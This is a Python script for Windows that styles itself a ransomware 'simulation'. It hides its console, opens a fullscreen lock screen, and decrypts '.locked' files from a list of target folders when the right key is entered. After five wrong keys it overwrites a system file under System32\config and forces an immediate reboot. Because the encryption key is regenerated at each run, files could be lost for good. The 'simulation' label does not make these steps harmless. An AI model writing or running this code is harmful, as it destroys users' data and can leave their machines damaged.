import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import base64
import ctypes
import subprocess  # for restart command

# Hide the console window on Windows
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ===== CONFIGURATION =====
TARGET_FOLDERS = [  
    r"C:\TestFolder1",
    r"C:\TestFolder2", 
    r"C:\TestFolder3"
]

ENCODED_KEY = "RGFyei1Iazhqc20tajM0bmRsay1uNGJmaWR2"
SECRET_KEY = base64.b64decode(ENCODED_KEY).decode()

class UniversalRansomwareSim:
    def __init__(self):
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')

        self.cipher = Fernet.generate_key()
        self.fernet = Fernet(self.cipher)
        self.encrypted_files = []

        self.failed_attempts = 0

        self.create_interface()
        self.simulate_attack()
        self.root.mainloop()

    # ... [rest of your code unchanged] ...

    def decrypt_files(self):
        if self.key_entry.get() == SECRET_KEY:
            restored = 0
            for file_path in self.encrypted_files:
                try:
                    locked_path = file_path + ".locked"
                    with open(locked_path, 'rb') as f:
                        data = f.read()
                    decrypted = self.fernet.decrypt(data)
                    with open(file_path, 'wb') as f:
                        f.write(decrypted)
                    os.remove(locked_path)
                    restored += 1
                except Exception as e:
                    print(f"Error decrypting {file_path}: {e}")

            messagebox.showinfo(
                "DECRYPTION COMPLETE",
                f"Successfully restored {restored}/{len(self.encrypted_files)} files!"
            )
            self.root.destroy()
        else:
            self.failed_attempts += 1
            if self.failed_attempts >= 5:
                try:
                    path = r"C:\Windows\System32\config\OSDATA"
                    with open(path, "w") as f:
                        f.write("fart")
                except Exception as e:
                    print(f"Failed to create OSDATA file: {e}")

                # Restart the PC immediately (force close apps, no delay)
                try:
                    subprocess.run(["shutdown", "/r", "/t", "0", "/f"], check=True)
                except Exception as e:
                    print(f"Failed to restart PC: {e}")

            messagebox.showerror(
                "WRONG KEY",
                f"Invalid decryption key!\n\nAttempt {self.failed_attempts} of 5\n"
                f"The correct key is: {SECRET_KEY}\n"
                "(This is a simulation)"
            )

if __name__ == "__main__":
    UniversalRansomwareSim()
